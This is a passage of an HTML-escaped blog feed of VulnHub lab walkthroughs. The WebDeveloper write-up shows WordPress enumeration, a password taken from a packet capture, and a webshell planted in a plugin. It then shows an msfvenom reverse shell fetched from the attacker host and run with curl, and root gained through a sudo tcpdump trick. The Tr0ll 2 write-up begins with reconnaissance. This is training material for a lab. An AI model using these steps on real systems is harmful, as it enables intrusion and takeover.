|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-generator: WordPress 4.9.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Example site &amp;amp;#8211&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just another WordPress site
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;A wordpress web page is running on port 80, we need to enumerate more in detail about it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We run wpscan to discover vulnerable plugins and themes and list potencial users.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.179.184/ &lt;span class=&quot;nt&quot;&gt;--enumerate&lt;/span&gt; vp,vt,u,dbe
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Upload directory has listing enabled: http://192.168.179.184/wp-content/uploads/                                                                                
 | Found By: Direct Access &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                   
 | Confidence: 100% 
 ...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] webdeveloper
 | Found By: Rss Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By:
 |  Wp Json Api &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |   - http://192.168.179.184/index.php/wp-json/wp/v2/users/?per_page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 |  Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |  Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we see, it was only possible to find a directory listing in the &lt;strong&gt;uploads&lt;/strong&gt; directory and a user.&lt;/p&gt;

&lt;p&gt;Then, a fast directory enumeration with dirb was found the &lt;strong&gt;ipdata&lt;/strong&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://192.168.179.184/ &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.179.184/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                                                                                     
+ http://192.168.179.184/index.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:301|SIZE:0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.184/ipdata/                                                                                                                       
+ http://192.168.179.184/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:403|SIZE:303&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                          
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.184/wp-admin/                                                                                                                     
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.184/wp-content/                                                                                                                   
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; DIRECTORY: http://192.168.179.184/wp-includes/                                                                                                                  
+ http://192.168.179.184/xmlrpc.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:405|SIZE:42&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It file contains the &lt;strong&gt;analyze.cap&lt;/strong&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://192.168.179.184/ipdata/analyze.cap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start wireshark.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wireshark &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp;/dev/null &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we click on a TCP package, right click and select &lt;strong&gt;follow TCP stream&lt;/strong&gt;, and we see that the webdeveloper user has logged in to wordpress.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We decode the password, so it is not readable.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;urlencode &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd'&lt;/span&gt;
Te5eQg&amp;amp;4sBS!Yr&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;wf%&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DcAd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We login as user &lt;strong&gt;webdeveloper&lt;/strong&gt; and password &lt;strong&gt;Te5eQg&amp;amp;4sBS!Yr$)wf%(DcAd&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;

&lt;p&gt;This user has elevate permissions, so that we add a webshell to the plugin &lt;strong&gt;akismet.php&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, we check that our php webshell is running successfully the &lt;strong&gt;id&lt;/strong&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/webdeveloper/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We list the system information and we detect that is a 64 bit operating system.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;urlencode &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
Linux webdeveloper 4.15.0-38-generic &lt;span class=&quot;c&quot;&gt;#41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We generate a linux 64 bit payload with msfvenom.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x64 &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; linux &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.179.1 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; evil
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start a python web server on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We set up a netcat listener on port 443, we run the following curl instruction that really do is download the paylod to the victim machine, give it execution permissions and execute it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;urlencode &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'curl 192.168.179.1/evil -o /tmp/evil &amp;amp;&amp;amp; chmod +x /tmp/evil &amp;amp;&amp;amp; /tmp/evil'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If everything wen well, we get a shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.184] 36790
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
www-data@webdeveloper:/var/www/html/wp-content/plugins/akismet&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing the wordpress config file was found the password of mysql connection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@webdeveloper:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 40 wp-config.php
...
// &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL settings - You can get this info from your web host &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; //
/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The name of the database &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;WordPress &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'wordpress'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database username &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'webdeveloper'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'MasterOfTheUniverse'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Database Charset to use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;creating database tables. &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_CHARSET'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'utf8mb4'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

/&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; The Database Collate type. Don&lt;span class=&quot;s1&quot;&gt;'t change this if in doubt. */
define('&lt;/span&gt;DB_COLLATE&lt;span class=&quot;s1&quot;&gt;', '');
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I tried to re-use the password &lt;strong&gt;MasterOfTheUniverse&lt;/strong&gt; to log in as the user webdeveloper.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@webdeveloper:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - webdeveloper
su - webdeveloper
Password: MasterOfTheUniverse

webdeveloper@webdeveloper:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can run the tcpdump tool with sudo permissions, a way to get root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webdeveloper@webdeveloper:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webdeveloper: MasterOfTheUniverse

Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;webdeveloper on webdeveloper:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /usr/sbin/tcpdump
webdeveloper@webdeveloper:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;

&lt;p&gt;We will reuse the payload generated before, set up a netcat listener on port 443, and we execute the following tcpdump command that will execute our payload as user root, this topic was extracted from &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tcpdump&quot;&gt;GTFOBINS&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webdeveloper@webdeveloper:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; lo &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/evil &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally we have a shell with root permissions, and read the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.184] 39914
script &lt;span class=&quot;nt&quot;&gt;-qc&lt;/span&gt; /bin/bash /dev/null
root@webdeveloper:/home/webdeveloper#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@webdeveloper:/home/webdeveloper# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@webdeveloper:/root# &lt;span class=&quot;nb&quot;&gt;ls 
ls 
&lt;/span&gt;flag.txt
root@webdeveloper:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
root@webdeveloper:/root#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: A machine specially designed to be vulnerable with certain changes to its previous version.</summary></entry><entry><title type="html">VulnHub - Tr0ll 2</title><link href="http://localhost:4000/tr0ll2.html" rel="alternate" type="text/html" title="VulnHub - Tr0ll 2" /><published>2021-12-31T00:00:00-05:00</published><updated>2021-12-31T00:00:00-05:00</updated><id>http://localhost:4000/tr0ll2</id><content type="html" xml:base="http://localhost:4000/tr0ll2.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Maleus&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To gain root and get Proof.txt from the /root directory.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/tr0ll-2,107/&quot;&gt;https://www.vulnhub.com/entry/tr0ll-2,107/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;A ping scan discovered the target host on the local network, the script can be downloaded &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.183 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;The full TCP port scan with nmap detected three open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.179.183 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;Service detection and script scanning were performed against the target host to get more information about open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80 192.168.179.183 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h3&gt;

&lt;p&gt;After few attempts I logged in with Tr0ll as username and password through the browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a zip file, we download it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

